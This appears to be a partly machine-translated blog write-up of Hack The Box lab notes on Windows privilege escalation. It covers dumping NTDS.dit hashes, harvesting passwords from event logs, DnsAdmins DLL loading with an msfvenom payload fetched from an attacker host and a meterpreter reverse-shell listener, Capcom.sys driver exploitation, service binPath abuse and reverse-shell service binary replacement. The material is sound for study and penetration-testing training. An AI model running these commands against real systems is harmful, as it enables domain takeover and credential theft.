<p>It's worth noting that if a folder or file has an explicit deny access to the current user or a group they belong to, even if <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag, will also prevent us from accessing the file.</p>
<p>After extracting NTDS.dit, we can use <code>secretsdump.py</code> or PowerShell <code>DSInternals</code> Tools such as modules extract all Active Directory account credentials. We use <code>DSInternals</code> Get the domain name <code>administrator</code> The NTLM hash of the account.</p>
<ol><li>Extract credentials from NTDS.dit</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module.\DSInternals.psd1
PS C:\htb&gt; $key = Get-BootKey -SystemHivePath.\SYSTEM
PS C:\htb&gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath.\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:</code></pre>
<p>We can also use it offline <code>SecretsDump</code> obtained from before <code>ntds.dit</code> Extract the hash value from the file. This data can then be passed hashed to access additional resources, or via <code>Hashcat</code> Hack offline to gain more access. If cracked, we can also provide customers with password cracking statistics, provide detailed information about password strength and usage within their domain, and recommend improvements to password policies (increasing minimum password length, creating banned dictionaries, etc.).</p>
<ol><li>Extract hashes using SecretsDump</li></ol>
<pre><code class="language-shell-session">henduoduo@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

&lt;SNIP&gt;</code></pre>
<p><strong>Robocopy</strong> Copy files with Robocopy built-in tools<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" rel="noreferrer" target="_blank">robocopy</a> Can also be used to back up files. Robocopy is a command-line directory copy tool. It can be used to create backup jobs and includes features such as multi-threaded replication, automatic retry, and recovery replication. Robocopy vs.<code>copy</code> The difference with the command is that not only does it copy all files, it also checks the destination directory and deletes files that are no longer in the source directory. It also compares files before copying, saving time and avoiding copying files that have not changed since the last copy/backup job.</p>
<pre><code class="language-cmd-session">C:\htb&gt; robocopy /B E:\Windows\NTDS.\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started: Thursday, May 6, 2021 1:11:47 PM
   Source: E:\Windows\NTDS\
     Dest: C:\Tools\ntds\

    Files: ntds.dit

  Options: /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs:         1         1         0         0         0         0
   Files:         1         1         0         0         0         0
   Bytes:   16.00 m   16.00 m         0         0         0         0
   Times:   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed:           356962042 Bytes/sec.
   Speed:           20425.531 MegaBytes/min.
   Ended: Thursday, May 6, 2021 1:11:47 PM</code></pre>
<h3>Event Log Readers Event Log Readers</h3>
<p>It is assumed that auditing of process creation events and corresponding command line values is enabled. At this point, the information is saved to the Windows Security Event Log as Event ID 4688: New Process Created. Organizations can support logging of process command lines to help defenders monitor and identify possible malicious behavior and identify binaries that should not be present on the system. This data can be transferred to a SIEM tool, or imported into a search tool such as ElasticSearch, allowing defenders to understand the binaries running on network systems. These tools will then flag any potentially malicious activity, such as those run on the marketing executive’s workstation <code>whoami</code>、<code>netstat</code> and <code>tasklist</code> command.</p>
<p>In the Windows Security Log:<strong>4688 = A new process has been created</strong></p>
<p>That is:</p>
<blockquote>When a program is started, the system writes a log.</blockquote>
<p>For example:</p>
<p>will produce 4688.</p>
<ul><li>Open cmd.exe</li><li>Run PowerShell</li><li>Execute whoami</li><li>Start an exe</li></ul>
<p>This research demonstrates some of the most common commands (tasks) executed by attackers after initial access <code>list</code> 、<code>ver</code>、<code>ipconfig</code>、<code>systeminfo</code> etc.), reconnaissance (<code>dir</code>、<code>net view</code>、<code>ping</code>、 <code>network usage</code> 、 <code>type</code> etc.) and spread malware within the network (<code>at</code>、<code>reg</code>、<code>wmic</code>、<code>wusa</code>,etc). In addition to monitoring the execution of these commands, organizations can go a step further and limit the execution of specific commands with finely tuned AppLocker rules. For organizations with tight security budgets, leveraging Microsoft's built-in tools can provide excellent visibility into network activity at the host level. Most modern enterprise EDR tools are capable of detection/blocking, but many organizations struggle to achieve this due to budget and staffing constraints. This small example shows that security improvements, such as network and host layer visibility, can be accomplished with minimal effort, cost, and huge impact.</p>
<p>A few years ago I performed a penetration test on a mid-sized organization with a small security team and no enterprise EDR, but using a configuration similar to the above (audit process creation and command line values). They captured and controlled one of my team members while they were executing with a member of the Finance Department workstation <code>tasklist</code> command (in use <code>Responder</code> After capturing the credentials and cracking them offline).</p>
<p>Administrators or members of the Event Log Reading?redirectedfrom=MSDN#event-log-readers) group have access to this log. System administrators may want to add power users or developers to this group to perform certain tasks without granting administrator privileges.</p>
<p><strong>Confirm group members</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.</code></pre>
<p>Published reference guide covering all built-in Windows commands, including syntax, parameters, and examples. Many Windows commands support passing passwords as arguments, and if auditing of the process command line is enabled, this sensitive information will be captured.</p>
<p>we can use<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" rel="noreferrer" target="_blank">wevtutil</a> tools and<a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.diagnostics/get-winevent?view=PowerShell-7.1" rel="noreferrer" target="_blank">Get-WinEvent</a> The PowerShell command prompt queries Windows events from the command line.</p>
<p><strong>Search security logs using wevtutil</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p>We can also use <code>Parameter /u</code> and <code>/p</code> for <code>wevtutil</code> Specify alternate credentials.</p>
<p><strong>Passing Credentials to wevtutil</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
<p>for <code>Get-WinEvent</code>, the syntax is as follows. In this example, we filter for process creation events (4688) where the process command line contains <code>/user</code>.</p>
<blockquote>NOTE: Use <code>Get-WInEvent</code> Search <code>Safety</code> Event log requires administrator rights or registry key <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> Make permission adjustments. just <code>Event log reading</code> Group membership is not enough.</blockquote>
<p><strong>Search security logs using Get-WinEvent</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p>This cmdlet is also available as another user <code>-Credential</code> parameters run. Other logs include PowerShell logs, which may contain sensitive information or credentials if script block or module logging is enabled. This log is open to users without permission.</p>
<h3>DnsAdmins DNS administrator</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" rel="noreferrer" target="_blank">DnsAdmins</a> Members of the group can access DNS information on the network. The Windows DNS service supports custom plug-ins and can call functions in the plug-ins to resolve name queries that are not within the scope of any locally hosted DNS zone. DNS service starts with <code>NT AUTHORITY\SYSTEM</code> mode, so membership in this group may be used to escalate privileges on a domain controller, or when there is a standalone server acting as the DNS server for the domain. You can use the built-in<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" rel="noreferrer" target="_blank">dnscmd</a> Tool to specify the path to the plug-in DLL. As detailed in this excellent article, the following attacks can be carried out when DNS is running on a domain controller (very common):</p>
<p>Management via RPC</p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> Allows us to load a custom DLL without any validation of the DLL path. This can be done via the command line <code>dnscmd</code> Tool complete</p>
<p>When <code>DnsAdmins</code> Members of the group perform the following <code>dnscmd</code> When commanded, register <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> The table key will be populated</p>
<p>When the DNS service is restarted, the DLL in this path will be loaded (i.e., the network share accessible to the domain controller machine account)</p>
<p>An attacker could load a custom DLL to obtain a reverse shell, or even load tools like Mimikatz as a DLL to dump credentials.</p>
<ul><li>DNS management is performed over RPC</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
<p><strong>Leveraging DnsAdmins Access, Leveraging DnsAdmins Access</strong></p>
<p>We can generate a malicious DLL using <code>msfvenom</code> Add user to <code>domain admins</code> in the group.</p>
<ol><li>Generate malicious DLL</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll</code></pre>
<p>Next, start a Python HTTP server.</p>
<ol><li>Start local HTTP server</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/)...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -</code></pre>
<p>Download the file to the target.</p>
<ol><li>Download file to target</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"</code></pre>
<p>We use msfconsole to open a listener, using this method:</p>
<pre><code>msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4242; run"</code></pre>
<ol><li>Load dll file:</li></ol>
<pre><code>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\reverseshell.dll</code></pre>
<p>Press enter or click to view image in full size</p>
<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png"/>
<ol><li>Stop and start DNS in cmd:</li></ol>
<pre><code class="language-cmd">sc stop dns
sc start dns</code></pre>
<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png"/>
<p>Then we get a reverse shell at the same time:</p>
<p>Press enter or click to view image in full size</p>
<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png"/>
<p>now you can get the flag on:</p>
<pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
<h3>Print Operators Print Operators</h3>
<p>The Print Operators group is another extremely privileged group that gives its members <code>SeLoadDriverPrivilege</code> Permissions to manage, create, share, and delete printers connected to domain controllers, as well as the authority to log on locally to the domain controller and shut it down. If we issue the command <code>whoami /priv</code>, and the group is not visible in a non-elevated context <code>SeLoadDriverPrivilege</code>, you need to bypass User Account Control (UAC).</p>
<ol><li>Confirm permissions</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled</code></pre>
<p>The UACMe code base provides a comprehensive list of UAC bypass methods available from the command line. Alternatively, we can open an administrator command shell from the Graphical User Interface (GUI) and enter the credentials of an account belonging to the Print Operators group. If we check the permissions again,<code>SeLoadDriverPrivilege</code> You will find that the permission is visible but disabled.</p>
<ol><li>Confirm permissions again</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre>
<p>As we all know, the driver <code>Capcom.sys</code> Contains functionality that allows any user to execute shellcode with SYSTEM privileges. We can leverage these permissions to load this vulnerable driver and escalate privileges. We can load the driver using this tool. This PoC not only enables permissions but also loads the driver for us.</p>
<p>Download it locally and edit it, pasting the following content into the corresponding location.</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;assert.h&gt;
#include &lt;winternl.h&gt;
#include &lt;sddl.h&gt;
#include &lt;stdio.h&gt;
#include "tchar.h"</code></pre>
<p>Next, from the Visual Studio 2019 developer command prompt, use<strong>cl.exe</strong>to compile.</p>
<p><strong>Compile using cl.exe</strong></p>
<pre><code class="language-cmd-session">C:\Users\mrb3n\Desktop\Print Operators&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj</code></pre>
<p><strong>Add driver reference</strong> <code>Capcom.sys</code> Next, download the driver from here and save it to the specified location <code>C:\temp</code>. Execute the following command to add a reference to the driver under the HKEY_CURRENT_USER tree.</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.</code></pre>
<p><code>\??\</code> The special syntax used to reference the path to a malicious driver image is an NT object path. The Win32 API will parse and parse this path in order to correctly locate and load our malicious driver.</p>
<p><strong>Confirm the driver is not loading</strong> Using Nirsoft<a href="http://www.nirsoft.net/utils/driverview.html" rel="noreferrer" target="_blank">DriverView.exe</a>, we can verify that the Capcom.sys driver is not loaded.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;.\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre>
<p><strong>Verify permissions are enabled</strong> Run this <code>EnableSeLoadDriverPrivilege.exe</code> binary file.</p>
<pre><code class="language-cmd-session">C:\htb&gt; EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0</code></pre>
<p><strong>Confirm Capcom driver is listed</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;.\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom

Driver Name: Capcom.sys
Filename: C:\Tools\Capcom.sys</code></pre>
<p><strong>Use the ExploitCapcom tool to escalate privileges</strong>To exploit Capcom.sys, we can first compile it with Visual Studio and then use the ExploitCapcom tool.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;.\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched</code></pre>
<p>This will start a shell with SYSTEM privileges.</p>
<img alt="Pasted image 20260228081647" src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png"/>
<p><strong>Alternative Method - No GUI</strong> If we cannot access the target system via GUI, we must <code>ExploitCapcom.cpp</code> Modify the code before compiling. Here we can edit line 292 and replace it with e.g.<code>"C:\\Windows\\system32\\cmd.exe"</code> Use <code>reverse shell binary</code> Reverse shell binary created.<code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
<pre><code class="language-c">// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;StartupInfo,
        &amp;ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}</code></pre>
<p>The string in this example <code>CommandLine</code> Change to:</p>
<pre><code class="language-c"> TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");</code></pre>
<p><code>msfvenom</code> We will set up a listener based on the generated payload, hoping to receive a reverse shell connection when executing the command <code>ExploitCapcom.exe</code>. If the reverse shell connection is blocked for some reason, we can try to bind the shell or execute/add user payload.</p>
<p><strong>Automation steps</strong> Automation with EopLoadDriver We can use tools like EoPLoadDriver to automate the process of enabling permissions, creating registry keys, and loading drivers <code>NTLoadDriver</code>. To do this we can run the following command:</p>
<pre><code class="language-cmd-session">C:\htb&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0</code></pre>
<p>Then we will run the command <code>ExploitCapcom.exe</code> to pop up a SYSTEM shell or run our custom binary.</p>
<p><strong>clean up</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.</code></pre>
<h3>Server Operators Server Operators</h3>
<p>The Server Operators group allows members to manage Windows servers without being assigned domain administrator rights. This is a very high-privileged group that can log into servers locally, including domain controllers. Join this group to gain powerful <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> permissions and can control local services.</p>
<p>let's take a look <code>AppReadiness</code> service. We can confirm that the service is via <code>sc.exe</code> The tool is started as SYSTEM.</p>
<ol><li>Query the AppReadiness Service</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE: 20  WIN32_SHARE_PROCESS
        START_TYPE: 3   DEMAND_START
        ERROR_CONTROL: 1   NORMAL
        BINARY_PATH_NAME: C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP:
        TAG: 0
        DISPLAY_NAME: App Readiness
        DEPENDENCIES:
        SERVICE_START_NAME: LocalSystem</code></pre>
<p>We can use service viewer/controller<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a>, which is part of the system's internal suite, to check service permissions.<code>PsService</code> works like <code>sc</code> Tool that displays service status and configuration and also allows you to start, stop, pause, resume and restart services on local and remote hosts.</p>
<ol><li>Check service permissions using PsService</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All</code></pre>
<p>This confirms that the server operator group has<a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" rel="noreferrer" target="_blank">SERVICE_ALL_ACCESS</a> access, giving us complete control over the service.</p>
<p>Let's look at the current members of the local Administrators group to confirm that our target account exists.</p>
<ol><li>Check local administrators group members</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.</code></pre>
<p>We change the binary path and execute a command to add the current user to the default local administrators group.</p>
<ol><li>Modify service binary path</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS</code></pre>
<p>Failed to start the service, which is expected.</p>
<ol><li>Service start</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</code></pre>
<blockquote>A "start" must be triggered before the command will be executed. The reason is simple: you change <code>binPath</code> Just changing the configuration is equivalent to changing the "program to be run at next startup".  <strong>But the service will only read at the moment it is started <code>binPath</code> and create a process.</strong></blockquote>
<p>If we check the membership of the Administrators group, we see that the command was executed successfully.</p>
<ol><li>Confirm local administrators group membership</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.</code></pre>
<p>From here, we have full control of the domain controller and can retrieve all credentials from the NTDS database, access other systems, and perform post-exploitation tasks.</p>
<ol><li>Confirm local administrator access to the domain controller</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ crackmapexec smb 10.129.29.67 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</code></pre>
<ol><li>Get NTLM password hashes from domain controller</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-secretsdump server_adm@10.129.29.67 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...</code></pre>
<h2>Attack operating system</h2>
<h3>User Account Control UAC</h3>
<ol><li><strong>UAC (User Account Control)</strong>is a Windows security mechanism used to:</li></ol>
<p>Key Features:</p>
<p>But please note:</p>
<ul><li>Needed in program<strong>Administrator rights</strong> A confirmation prompt pops up when</li><li>Prevent the system from being<strong>Unauthorized program modification</strong></li><li>By default, programs start with<strong>Standard User</strong> run</li><li>Only administrators<strong>explicitly allowed</strong> Only then will you be elevated to administrator privileges</li><li>The main purpose is<strong>Reduce the impact of misuse and malware</strong></li></ul>
<blockquote>Not a strict security boundary, just a protective layer.</blockquote>
<blockquote>If an attacker is already on the system, it is still possible to pass<strong>UAC Bypass</strong> Elevate authority.</blockquote>
<h3>Weak permission configuration</h3>
<p>Setting up system permissions is complex and challenging. A slight modification in one place may cause flaws elsewhere. As penetration testers, we need to understand how permissions work in Windows and how misconfigurations can be exploited to escalate privileges. The permission-related flaws discussed in this section are relatively rare (but do occasionally occur) in software applications released by large vendors, while they are common in third-party software, open source software, and custom applications from smaller vendors. Services are usually installed with system privileges, so exploiting flaws related to service privileges often allows full control of the target system. Regardless of the environment, we should always check for weak permissions, both with the help of tools and by hand, in case the tools are inconvenient to use.</p>
<p><strong>Here are four types of privilege escalation</strong></p>
<ol><li>File writable -&gt; Replace service exe</li><li>Service controllable -&gt; Change <code>binpath</code></li><li>The path is not quoted -&gt; pre-emptive execution of malicious exe</li><li>Registry is writable -&gt; change <code>ImagePath</code> or auto-start item</li></ol>
<p>****</p>
<ol><li>Permissive File System ACLs (writable service files)</li></ol>
<p><strong>concept</strong>: if a<strong>Service program files running with SYSTEM permissions are writable by ordinary users</strong>, the attacker can replace the executable file, allowing the system to execute a malicious program when starting the service, thereby gaining high privileges.</p>
<p><strong>Utilization steps</strong></p>
<p><strong>① Enumerate service files with weak ACLs</strong>: Automatic scanning system<strong>Service binary permissions are configured incorrectly</strong>.</p>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② Check file ACL</strong>: Confirm <code>Users</code> or <code>Everyone</code> Do you have<strong>Write permission/Full Control</strong>.</p>
<pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<p><strong>③ Generate malicious programs</strong> For example, generate a reverse shell:</p>
<pre><code>msfvenom -p windows/shell_reverse_tcp -f exe &gt; SecurityService.exe</code></pre>
<p><strong>④ Replace the service binary file</strong></p>
<pre><code>copy SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
